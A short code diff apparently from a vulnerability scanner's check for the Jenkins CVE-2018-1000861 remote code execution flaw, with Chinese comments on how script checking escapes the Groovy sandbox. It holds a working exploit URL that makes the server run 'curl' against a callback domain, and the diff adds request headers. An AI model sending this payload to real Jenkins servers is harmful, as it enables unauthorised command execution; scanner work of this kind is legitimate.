@@ -12,7 +12,7 @@ cve_2018_1000861_payloads = [
     {'path': 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl DNSDOMAIN".execute()}}'}
 ]
     
-def cve_2018_1000861_scan(self, clients):
+def cve_2018_1000861_scan(clients):
     ''' Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误
             检查操作是没有沙盒的, 攻击者可以通过Meta-Programming的方式, 在检查这个步骤时执行任意命令
     '''
@@ -20,9 +20,14 @@ def cve_2018_1000861_scan(self, clients):
     sessid = 'ae9b030320374b97c35d76dfbe5c5eb6'
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Jenkins',
         'vul_type': 'RCE',
         'vul_id': 'CVE-2018-1000861',
+    }
+
+    headers = {
+        'Origin': client.protocol_domain,
+        'Referer': client.protocol_domain,
     }
 
     for payload in cve_2018_1000861_payloads:
@@ -34,6 +39,7 @@ def cve_2018_1000861_scan(self, clients):
         res = client.request(
             'get',
             path,
+            headers=headers,
             vul_info=vul_info
         )
         if res is None:
